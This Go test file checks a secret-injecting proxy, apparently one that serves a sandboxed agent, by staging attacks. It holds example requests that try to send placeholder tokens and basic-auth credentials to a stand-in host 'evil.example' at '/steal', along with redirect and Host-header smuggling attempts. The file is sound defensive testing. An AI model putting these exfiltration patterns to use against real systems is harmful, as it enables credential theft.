package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"errors"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"
)

// These tests are written as attacks. Each one sends a placeholder through
// the proxy and checks where the real value ends up. The real value must
// only ever reach the host and slot its policy names.

const (
	allowedHost  = "gitlab.example"
	attackerHost = "evil.example"
	tokenValue   = "glpat-real-value-123"
)

var testPolicy = &Policy{Secrets: map[string]*Rule{
	"GITLAB_TOKEN":      {Hosts: []string{allowedHost}, Header: "Private-Token"},
	"REGISTRY_PASSWORD": {Hosts: []string{allowedHost}, BasicAuth: &BasicAuth{Username: "deploy-bot"}},
	"MAPS_KEY":          {Hosts: []string{allowedHost}, Query: "key"},
}}

var testValues = map[string]string{
	"GITLAB_TOKEN":      tokenValue,
	"REGISTRY_PASSWORD": "registry-real-pass",
	"MAPS_KEY":          "maps-real-key",
}

// seen is what a fake server received
type seen struct {
	Method string
	Host   string
	Path   string
	Query  url.Values
	Header http.Header
	Body   string
}

func (s seen) raw() string {
	return s.Method + " " + s.Host + s.Path + "?" + s.Query.Encode() + "\n" + headerText(s.Header) + "\n" + s.Body
}

func headerText(h http.Header) string {
	var b strings.Builder
	h.Write(&b)
	return b.String()
}

type fakeServer struct {
	mu   sync.Mutex
	got  []seen
	addr string
}

func (f *fakeServer) requests() []seen {
	f.mu.Lock()
	defer f.mu.Unlock()
	return slices.Clone(f.got)
}

func (f *fakeServer) handler(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		f.mu.Lock()
		f.got = append(f.got, seen{r.Method, r.Host, r.URL.Path, r.URL.Query(), r.Header.Clone(), string(body)})
		f.mu.Unlock()
		if next != nil {
			next(w, r)
		}
	}
}

type harness struct {
	t        *testing.T
	proxy    *Proxy
	proxyURL *url.URL
	entries  chan Entry
	allowed  *fakeServer
	attacker *fakeServer
	plain    *fakeServer
	lookups  []string
	mu       sync.Mutex
	client   *http.Client
}

// newHarness starts the proxy with testPolicy plus three fake servers: the
// allowed host and an attacker over TLS, and the allowed host over plain
// HTTP. The proxy's dialer sends each host name to the matching server.
func newHarness(t *testing.T, allowedHandler http.HandlerFunc) *harness {
	t.Helper()
	h := &harness{t: t, entries: make(chan Entry, 32)}

	// Real-looking certificates for the fake servers, from a separate CA
	// standing in for the public web PKI
	webCA, err := newAuthority([]string{allowedHost, attackerHost})
	if err != nil {
		t.Fatal(err)
	}
	startTLS := func(host string, handler http.HandlerFunc) *fakeServer {
		f := &fakeServer{}
		srv := httptest.NewUnstartedServer(f.handler(handler))
		cert, err := webCA.leaf(host)
		if err != nil {
			t.Fatal(err)
		}
		srv.TLS = &tls.Config{Certificates: []tls.Certificate{*cert}}
		srv.StartTLS()
		t.Cleanup(srv.Close)
		f.addr = srv.Listener.Addr().String()
		return f
	}
	h.allowed = startTLS(allowedHost, allowedHandler)
	h.attacker = startTLS(attackerHost, nil)
	h.plain = &fakeServer{}
	plainSrv := httptest.NewServer(h.plain.handler(nil))
	t.Cleanup(plainSrv.Close)
	h.plain.addr = plainSrv.Listener.Addr().String()

	lookup := func(name string) (string, error) {
		h.mu.Lock()
		h.lookups = append(h.lookups, name)
		h.mu.Unlock()
		if v, ok := testValues[name]; ok {
			return v, nil
		}
		return "", errors.New("not in the keychain")
	}
	h.proxy = NewProxy(func(e Entry) { h.entries <- e }, lookup)
	routes := map[string]string{
		allowedHost + ":443":  h.allowed.addr,
		attackerHost + ":443": h.attacker.addr,
		allowedHost + ":80":   h.plain.addr,
	}
	var d net.Dialer
	h.proxy.dial = func(ctx context.Context, network, addr string) (net.Conn, error) {
		if to, ok := routes[addr]; ok {
			return d.DialContext(ctx, network, to)
		}
		return nil, errors.New("no route to " + addr)
	}
	webRoots := x509.NewCertPool()
	webRoots.AddCert(webCA.cert)
	h.proxy.transport.TLSClientConfig = &tls.Config{RootCAs: webRoots}

	ca, err := h.proxy.SetPolicy(testPolicy)
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(h.proxy)
	t.Cleanup(srv.Close)
	h.proxyURL, _ = url.Parse(srv.URL)

	// The client trusts the web CA, as a real one trusts public roots, plus
	// the proxy's local CA, as the sandbox does through SSL_CERT_FILE
	clientRoots := webRoots.Clone()
	clientRoots.AddCert(ca.cert)
	h.client = &http.Client{
		Transport: &http.Transport{Proxy: http.ProxyURL(h.proxyURL), TLSClientConfig: &tls.Config{RootCAs: clientRoots}},
		Timeout:   5 * time.Second,
	}
	return h
}

func (h *harness) do(req *http.Request) *http.Response {
	h.t.Helper()
	resp, err := h.client.Do(req)
	if err != nil {
		h.t.Fatal(err)
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp
}

func newRequest(t *testing.T, method, rawURL, body string) *http.Request {
	t.Helper()
	req, err := http.NewRequest(method, rawURL, strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	return req
}

func (h *harness) only(f *fakeServer) seen {
	h.t.Helper()
	got := f.requests()
	if len(got) != 1 {
		h.t.Fatalf("server got %d requests, want 1", len(got))
	}
	return got[0]
}

// assertNoValueReached fails if any real value shows up anywhere in what a
// server received, raw or base64-encoded
func assertNoValueReached(t *testing.T, f *fakeServer) {
	t.Helper()
	for _, r := range f.requests() {
		raw := r.raw()
		for name, v := range testValues {
			if strings.Contains(raw, v) || strings.Contains(raw, base64.StdEncoding.EncodeToString([]byte(v))) {
				t.Fatalf("value of %s reached a server it must not reach:\n%s", name, raw)
			}
		}
	}
}

func TestValueGoesIntoTheNamedHeaderOnly(t *testing.T) {
	h := newHarness(t, nil)
	req := newRequest(t, "POST", "https://"+allowedHost+"/api/v4/issues?title={{GITLAB_TOKEN}}", "body {{GITLAB_TOKEN}}")
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")
	req.Header.Set("X-Other", "{{GITLAB_TOKEN}}")

	if resp := h.do(req); resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d", resp.StatusCode)
	}

	got := h.only(h.allowed)
	if v := got.Header.Get("Private-Token"); v != tokenValue {
		t.Fatalf("Private-Token = %q", v)
	}
	// Writing the placeholder into an issue body on an allowed host must not
	// turn it into the value, or the agent could read it back from the issue
	if strings.Contains(got.Body, tokenValue) || got.Header.Get("X-Other") != "{{GITLAB_TOKEN}}" || got.Query.Get("title") != "{{GITLAB_TOKEN}}" {
		t.Fatalf("value leaked outside its header: %+v", got)
	}

	e := nextEntry(t, h.entries)
	if e.Kind != "https" || e.Host != allowedHost || !slices.Equal(e.Secrets, []string{"GITLAB_TOKEN"}) {
		t.Fatalf("entry = %+v", e)
	}
}

func TestPlaceholderSentElsewhereStaysAPlaceholder(t *testing.T) {
	h := newHarness(t, nil)
	encoded := base64.StdEncoding.EncodeToString([]byte("{{GITLAB_TOKEN}}"))
	req := newRequest(t, "POST", "https://"+attackerHost+"/steal?t={{GITLAB_TOKEN}}", "{{GITLAB_TOKEN}} "+encoded)
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")
	req.SetBasicAuth("deploy-bot", "{{REGISTRY_PASSWORD}}")

	h.do(req)

	got := h.only(h.attacker)
	if got.Header.Get("Private-Token") != "{{GITLAB_TOKEN}}" {
		t.Fatalf("attacker got Private-Token %q", got.Header.Get("Private-Token"))
	}
	assertNoValueReached(t, h.attacker)
	if len(h.lookups) != 0 {
		t.Fatalf("proxy read %v for a host no policy names", h.lookups)
	}
}

func TestRedirectToAnotherHostCarriesOnlyThePlaceholder(t *testing.T) {
	h := newHarness(t, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/redirect" {
			http.Redirect(w, r, "https://"+attackerHost+"/landing", http.StatusFound)
		}
	})
	req := newRequest(t, "GET", "https://"+allowedHost+"/redirect", "")
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")

	h.do(req)

	got := h.only(h.attacker)
	if got.Path != "/landing" {
		t.Fatalf("redirect was not followed: %+v", got)
	}
	assertNoValueReached(t, h.attacker)
}

func TestRequestForAnotherHostInsideTheTunnelIsRefused(t *testing.T) {
	h := newHarness(t, nil)
	req := newRequest(t, "GET", "https://"+allowedHost+"/", "")
	req.Host = attackerHost
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")

	resp := h.do(req)

	if resp.StatusCode != http.StatusMisdirectedRequest {
		t.Fatalf("status = %d", resp.StatusCode)
	}
	if n := len(h.allowed.requests()); n != 0 {
		t.Fatalf("request was forwarded %d times", n)
	}
	if len(h.lookups) != 0 {
		t.Fatalf("proxy read %v for a refused request", h.lookups)
	}
}

func TestBasicAuthPasswordIsFilledForTheRightUser(t *testing.T) {
	h := newHarness(t, nil)
	req := newRequest(t, "GET", "https://"+allowedHost+"/v2/", "")
	req.SetBasicAuth("deploy-bot", "{{REGISTRY_PASSWORD}}")

	h.do(req)

	user, pass, _ := (&http.Request{Header: h.only(h.allowed).Header}).BasicAuth()
	if user != "deploy-bot" || pass != testValues["REGISTRY_PASSWORD"] {
		t.Fatalf("basic auth = %q / %q", user, pass)
	}
}

func TestBasicAuthWithAnotherUserIsRefused(t *testing.T) {
	h := newHarness(t, nil)
	req := newRequest(t, "GET", "https://"+allowedHost+"/v2/", "")
	req.SetBasicAuth("someone-else", "{{REGISTRY_PASSWORD}}")

	resp := h.do(req)

	if resp.StatusCode != http.StatusBadGateway || len(h.allowed.requests()) != 0 {
		t.Fatalf("status = %d, forwarded = %d", resp.StatusCode, len(h.allowed.requests()))
	}
}

func TestQueryParameterIsFilled(t *testing.T) {
	h := newHarness(t, nil)

	h.do(newRequest(t, "GET", "https://"+allowedHost+"/maps?key={{MAPS_KEY}}&q={{MAPS_KEY}}", ""))

	got := h.only(h.allowed)
	if got.Query.Get("key") != testValues["MAPS_KEY"] || got.Query.Get("q") != "{{MAPS_KEY}}" {
		t.Fatalf("query = %v", got.Query)
	}
}

func TestPlainHTTPIsNeverFilled(t *testing.T) {
	h := newHarness(t, nil)
	req := newRequest(t, "GET", "http://"+allowedHost+"/api", "")
	req.Header.Set("Private-Token", "{{GITLAB_TOKEN}}")

	h.do(req)

	if got := h.only(h.plain); got.Header.Get("Private-Token") != "{{GITLAB_TOKEN}}" {
		t.Fatalf("value sent over plain HTTP: %q", got.Header.Get("Private-Token"))
	}
}

func TestMissingValueFailsTheRequest(t *testing.T) {
	h := newHarness(t, nil)
	pol := &Policy{Secrets: map[string]*Rule{"UNSTORED": {Hosts: []string{allowedHost}, Header: "X-Key"}}}
	if _, err := h.proxy.SetPolicy(pol); err != nil {
		t.Fatal(err)
	}
	req := newRequest(t, "GET", "https://"+allowedHost+"/", "")
	req.Header.Set("X-Key", "{{UNSTORED}}")

	resp := h.do(req)

	if resp.StatusCode != http.StatusBadGateway || len(h.allowed.requests()) != 0 {
		t.Fatalf("status = %d, forwarded = %d", resp.StatusCode, len(h.allowed.requests()))
	}
}

func TestRequestWithoutPlaceholdersIsForwardedUnchanged(t *testing.T) {
	h := newHarness(t, nil)
	req := newRequest(t, "GET", "https://"+allowedHost+"/public", "")
	req.Header.Set("Private-Token", "already-a-real-token")

	h.do(req)

	if got := h.only(h.allowed); got.Header.Get("Private-Token") != "already-a-real-token" {
		t.Fatalf("header = %q", got.Header.Get("Private-Token"))
	}
	if len(h.lookups) != 0 {
		t.Fatalf("proxy read %v with nothing to fill", h.lookups)
	}
}

func TestCAIsMadeAgainOnlyWhenHostsChange(t *testing.T) {
	p := NewProxy(func(Entry) {}, nil)
	first, _ := p.SetPolicy(testPolicy)

	same, _ := p.SetPolicy(&Policy{Secrets: map[string]*Rule{"X": {Hosts: []string{allowedHost}, Header: "X"}}})
	other, _ := p.SetPolicy(&Policy{Secrets: map[string]*Rule{"X": {Hosts: []string{"other.example"}, Header: "X"}}})
	none, _ := p.SetPolicy(&Policy{})

	if same != first || other == first || none != nil {
		t.Fatalf("first=%p same=%p other=%p none=%p", first, same, other, none)
	}
}
